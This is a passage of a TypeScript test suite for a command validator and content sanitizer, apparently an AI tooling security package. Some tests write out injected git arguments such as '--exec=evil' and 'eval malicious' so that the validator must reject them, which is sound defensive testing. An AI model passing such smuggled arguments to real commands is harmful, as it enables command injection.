      validateCommand('git', ['sparse-checkout', 'set', 'src/']).isValid
    ).toBe(true);
    expect(validateCommand('git', ['sparse-checkout', 'list']).isValid).toBe(
      true
    );
  });

  it('should block unknown sparse-checkout actions', () => {
    expect(
      validateCommand('git', ['sparse-checkout', 'eval', 'malicious']).isValid
    ).toBe(false);
  });

  it('should block unknown sparse-checkout flags', () => {
    expect(
      validateCommand('git', ['sparse-checkout', 'init', '--exec=evil']).isValid
    ).toBe(false);
  });
});

describe('ATTACK-16: False Positive Prevention', () => {
  it('should preserve normal code through sanitization', () => {
    const code = `
function calculateTotal(items: Item[]): number {
  return items.reduce((sum, item) => sum + item.price, 0);
}
export default calculateTotal;
`;
    const result = ContentSanitizer.sanitizeContent(code);
    expect(result.content).toContain('calculateTotal');
    expect(result.content).toContain('items.reduce');
    expect(result.hasSecrets).toBe(false);
  });

  it('should preserve file paths and line numbers', () => {
    const pathData = '/workspace/src/components/Button.tsx:42:10';
    const result = ContentSanitizer.sanitizeContent(pathData);
    expect(result.content).toBe(pathData);
    expect(result.hasSecrets).toBe(false);
  });

  it('should preserve git hashes (not mistaken for secrets)', () => {
    const gitHash = 'commit a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0';
    const result = ContentSanitizer.sanitizeContent(gitHash);
    expect(result.content).toContain(
      'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0'
    );
  });

  it('should preserve base64 encoded content that is not a secret', () => {
    const b64 = 'SGVsbG8gV29ybGQ=';
    const result = ContentSanitizer.sanitizeContent(b64);
    expect(result.content).toBe(b64);
  });

  it('should preserve URLs without credentials', () => {
    const url = 'https://api.github.com/repos/owner/repo/contents/src/index.ts';
    const result = ContentSanitizer.sanitizeContent(url);
    expect(result.content).toBe(url);
  });

  it('should preserve error stack traces', () => {
    const stack = `Error: ENOENT: no such file or directory
    at Object.openSync (node:fs:603:3)
    at readFileSync (node:fs:471:35)
    at /workspace/src/loader.ts:25:20`;
    const result = ContentSanitizer.sanitizeContent(stack);
    expect(result.content).toContain('ENOENT');
    expect(result.content).toContain('loader.ts:25:20');
  });
});

describe('EXTENSIBILITY: SecurityRegistry export', () => {
  it('should export SecurityRegistry class and securityRegistry singleton', async () => {
    const mod = await import('octocode-security');
    expect(mod.SecurityRegistry).toBeDefined();
    expect(mod.securityRegistry).toBeDefined();
    expect(mod.securityRegistry.constructor.name).toBe('SecurityRegistry');
    expect(typeof mod.securityRegistry.addSecretPatterns).toBe('function');
    expect(typeof mod.securityRegistry.addAllowedCommands).toBe('function');
    expect(typeof mod.securityRegistry.addIgnoredPathPatterns).toBe('function');
    expect(typeof mod.securityRegistry.addIgnoredFilePatterns).toBe('function');
    expect(typeof mod.securityRegistry.reset).toBe('function');
  });
});
